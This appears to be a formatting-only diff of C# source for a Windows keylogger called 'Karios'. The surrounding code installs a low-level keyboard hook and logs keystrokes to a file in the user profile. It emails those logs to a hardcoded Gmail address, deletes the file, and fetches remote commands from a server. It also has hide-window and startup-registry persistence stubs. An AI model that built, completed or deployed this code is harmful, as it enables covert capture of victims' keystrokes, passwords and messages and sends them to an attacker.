@@ -31,7 +31,6 @@ namespace Karios
 
         public static void Main()
         {
-
             Console.WriteLine("Starting commandget");
             Console.ReadKey();
             CommandGet();
@@ -59,8 +58,6 @@ namespace Karios
 
         public static void RunApplication()
         {
-
-
             // Hide the window
 
 
@@ -181,7 +178,8 @@ namespace Karios
                         commands = client.DownloadString(serverAddress + paramaters);
                     }
                     catch (WebException)
-                    { }//TODO: Handle this Exception.
+                    {
+                    } //TODO: Handle this Exception.
                     var preppedCommand = commands.Split(' ');
 #pragma warning disable 1587
                     /// <summary>
@@ -209,7 +207,9 @@ namespace Karios
                     loop = false;
                 }
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -232,7 +232,7 @@ namespace Karios
             var fileName = DateTime.Now.ToString("yyyy-MM-dd");
             // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
             var pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" +
-                            fileName + ".txt";// TODO - get more secret location.
+                            fileName + ".txt"; // TODO - get more secret location.
             var sw = new StreamWriter(pathToLog, true);
             if ((Keys)vkCode != Keys.Space && (Keys)vkCode != Keys.Enter)
             {
@@ -251,11 +251,16 @@ namespace Karios
             try
             {
                 var mail = new MailMessage();
-                var smtpServer = new SmtpClient("smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
+                var
+                    smtpServer =
+                        new SmtpClient(
+                            "smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
                 mail.From = new MailAddress("GINGIRULES@gmail.com");
                 mail.To.Add("GINGIRULES@gmail.com");
-                mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
+                mail.Subject = "log from keylogger on" +
+                               Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " +
+                            DateTime.Now.ToString("yyyy-MM-dd");
                 Attachment attachment;
                 attachment = new Attachment(pathToLog);
                 mail.Attachments.Add(attachment);
@@ -267,7 +272,9 @@ namespace Karios
                 attachment.Dispose();
                 //copy program to an new destination
             }
-            catch { }
+            catch
+            {
+            }
 
             //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
             var alldrives = DriveInfo.GetDrives();
@@ -286,11 +293,10 @@ namespace Karios
             File.Delete(pathToLog);
             return CallNextHookEx(_hookId, nCode, wParam, lParam);
         }
+
         /// <summary>
         /// Sets the startup registary key
         /// </summary>
-
-
         public static void SetStartup()
         {
             /*
@@ -340,9 +346,10 @@ namespace Karios
             {
                 try
                 {
-
                 }
-                catch { }
+                catch
+                {
+                }
             }
         }
 
@@ -352,10 +359,10 @@ namespace Karios
             {
                 try
                 {
-
-
                 }
-                catch { }
+                catch
+                {
+                }
             }
         }
 
